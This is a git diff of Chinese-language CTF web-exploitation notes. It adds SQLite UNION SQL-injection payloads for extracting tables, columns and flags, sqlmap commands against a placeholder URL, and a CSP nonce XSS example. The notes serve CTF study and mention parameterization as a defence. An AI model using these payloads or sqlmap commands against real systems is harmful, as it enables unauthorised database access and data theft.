@@ -2129,9 +2129,10 @@ SELECT * FROM table WHERE column LIKE '%${name}%';
 ```
 数组元素之间会用`,`连接起来。
 - 当sql注入点在url传入的参数且参数是个数组时，可利用sqlmap注入url的数组传参。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --level 5 --risk 3 --dbms=sqlite --tables -dump`。如果数据库的类型不知道也可以不指定。此为测试语句，当测试出来哪种方法最快时，可以直接对sqlmap指定注入方式(例如union select)。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --dbms=sqlite --tables --technique=U`
-- sqlite的union联合注入
-    - 查表名：`' UNION SELECT 1, sql FROM sqlite_master WHERE type="table" --`
-    - 查字段：`' UNION SELECT 1, flag FROM table--`
+- sqlite的union联合注入( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md )
+    - 查表名：`' UNION SELECT 1, sql FROM sqlite_master WHERE type="table" --`,`' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%`
+    - 查column名称：`' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name like 'table'--`
+    - 查字段：`' UNION SELECT 1, flag FROM table--`,`' UNION SELECT column FROM mystery WHERE column like 'flag'--`,`'union select * from table --`
 - [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)可预防sql注入，当题目里出现这些逻辑时就可以放弃考虑sql注入了
 229. [yolo](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/yolo),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=1123s)
 - CSP `script-src 'nonce-test'`指定只有带着`test`的script标签才能执行js。例如`<script>alert(1)</script>`会被浏览器阻挡，但`<script nonce="test">alert(1)</script>`则能执行（因为其指定的nonce值和服务器设置的csp值一致）
@@ -2342,6 +2343,7 @@ python:false
 mariadb:true
 ```
 json由处理差异导致的漏洞可参考 https://bishopfox.com/blog/json-interoperability-vulnerabilities ，从这里面提到的内容入手
+
 241. [RESTful swap](https://xhacka.github.io/posts/RESTful-swap/)
 - 使用vim编辑文件后会额外出现[swap](https://www.baeldung.com/linux/vim-swap-files#:~:text=While%20editing%20a%20file%20with,copy%20of%20the%20edited%20file.)文件，为被编辑文件的拷贝，也就是说里面有被编辑文件的内容。swap文件命名遵循以下规律：
 ```sh
